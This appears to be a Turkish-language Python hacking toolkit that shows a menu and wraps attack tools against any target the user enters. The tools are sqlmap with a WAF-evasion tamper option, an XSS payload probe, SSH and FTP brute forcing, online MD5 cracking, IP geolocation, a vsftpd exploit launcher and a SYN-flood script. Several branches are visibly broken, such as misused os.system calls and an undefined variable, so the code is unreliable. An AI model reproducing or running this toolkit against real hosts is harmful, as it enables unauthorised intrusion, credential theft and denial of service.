import hashlib
import os
import json
import subprocess
import urllib3
import socket
import requests
import colorama
import random
import string
from colorama import Fore, Back, Style, init
print("""
██╗     ██╗   ██╗██╗  ██╗ █████╗      ██████╗ ██████╗ ██████╗ ███████╗██████╗ 
██║     ██║   ██║██║ ██╔╝██╔══██╗    ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗
██║     ██║   ██║█████╔╝ ███████║    ██║     ██║   ██║██║  ██║█████╗  ██████╔╝
██║     ██║   ██║██╔═██╗ ██╔══██║    ██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗
███████╗╚██████╔╝██║  ██╗██║  ██║    ╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
      YouTube : https://www.youtube.com/channel/UCqOj20IIgiZVmBfQnxALHeg
      Coder : LUKA CODER
      İnstagram : luka.cybersec
      git hub : https://github.com/lukacoder
""")
print("""

=> use      :                        |
- help (yardım)                      |
- nmap (port scanner nmapr)          |
- dmitry (use dmitry  scanner)       |
- xss (python payload)               |     
- Sql (use sqlmap)                   |
- nikto (-h parametre)               |
- urlcrazy (urlcrazy use)            |
- ssh ( brute force)                 |
- ftp (ftp brute force)              |
- md5crack (md5 cracker)             |
- iptrace (ip tracer , ip info)      |
- md5gen (md5 generator)             |
- whois (whois adress)               |
- subdomain (subdomain finder)       |
- vsftpd (exploit)                   |
- synack (py syn-ack flood)          |
- ddos (python ddos flood)           |
- clear (terminal clear)             |
""")
while True :
      veri = input("Seçenek seç => ")
      if veri == "help": 
            print(""" 
=> use      :                        |
- help (yardım)                      |
- nmap (port scanner nmapr)          |
- dmitry (use dmitry  scanner)       |
- xss (python payload)               |     
- Sql (use sqlmap)                   |
- nikto (-h parametre)               |
- urlcrazy (urlcrazy use)            |
- ssh ( brute force)                 |
- ftp (ftp brute force)              |
- md5crack (md5 cracker)             |
- iptrace (ip tracer , ip info)      |
- md5gen (md5 generator)             |
- whois (whois adress)               |
- subdomain (subdomain finder)       |
- vsftpd (exploit)                   |
- synack (py syn-ack flood)          |
- ddos (python ddos flood)           |
- clear (terminal clear)             |

""")
      if veri == "nmap":
            portscan = input("Hedef adresi ver =>")
            os.system("nmap "+portscan)
      if veri == "dmitry":
            site = input("Hedef =>")
            os.system("dmitry -w ", site)
            os.system("dmitry -o ", site)
            os.system("dmitry -i ", site)
            os.system("dmitry -n ", site)
            os.system("dmitry -s ", site)
            os.system("dmitry -e ", site)
            os.system("dmitry -p ", site)
      if veri == "xss":
            target = input("Hedef URL : ")
            payload = ("<script>alert(123123);</script>")
            req = requests.post(target + payload)
            if payload in req.text:
                  print ("XSS Açığı keşfetildi...")
                  print ("Saldırı Yükü: "+payload)
            else:
                print ("Güvenli ")
      if veri == "sql":
            vulnsql = input("URL : ")
            os.system("sqlmap -u"+vulnsql+" --dbs --random-agent --tamper=space2comment ")
      if veri == "nikto":
            kulan = input("hedef =>")
            os.system("nikto -h "+kulan)
      if veri == "urlcrazy":
            url = input("url gir(site) => ")
            os.system("urlcrazy "+ url)
      if veri == "ssh":
           hostd = input("Wordlist yolu => ")
           hosta = input("Username var ise => ")
           hostb = input("Host adres => ")
           os.system("python3 sshbrute --wordlist "+hostd+" -U "+hosta+" -P 22 "+hostb)
      if veri == "ftp":
           hedef1 =  input("Hedef => ")
           dosyauser1 = input("Username dosyası => ")
           dosyapass1 = input("Password dosyası => ")
           host1 = input("İp adres =>")
           os.system("medusa -U "+dosyauser1+" -P "+dosyapass1+" -h "+host1 +" -M ftp")
      if veri == "md5crack":
            dat2 = input("Kırılacak MD5 Hash ==> ")
            print("")
            print("_______________________________")
            print("")
            response = requests.get('http://www.nitrxgen.net/md5db/' + dat2).text
            print("crack sonucu => " , response)
            print("")
            print("cracklenen hash => " ,dat2)
            print("")
            print("_______________________________")
      if  veri == "iptrace":
            target5= input("[+]Target -> : ")
            data = subprocess.check_output(["curl",f"http://ip-api.com/json/" + target ]).decode("utf-8")
            json.loads(data)
            print("İp Adress   => " , json.loads(data)["query"])
            print("şehir => " , json.loads(data)["city"])
            print("Ülke  => " , json.loads(data)["country"])
            print("Posta Kodu  => " , json.loads(data)["zip"])
            print("Host   => " , json.loads(data)["isp"])
            print("Host   => " , json.loads(data)["org"])
            print("lat  => " , json.loads(data)["lat"])
            print("lon  => " , json.loads(data)["lon"])
            print("adres için  lat değeri ve lon değerini sayılarını google'a yazınız ")
      if veri == "md5gen":
            user = input("YAZIYI GİR :  ")
            h = hashlib.md5(user.encode())
            h2 = h.hexdigest()        
            print(h2)
      if veri == "whois":
            klk = input("Hedef site => ")
            os.system("whois "+klk)
      if veri == "subdomain":
            os.system("python3 subdomainfinder")
      if veri == "vsftpd":
            ipad = input("Hedef host => ")
            os.system("python3 vsftpdexploit"+ipad)
      if veri == "synack":
            os.system("python3 synack")
      if veri == "whatweb":
            what = input(" target => ")
            os.system("whatweb "+what)            
      if veri == "clear":
            os.system("clear")

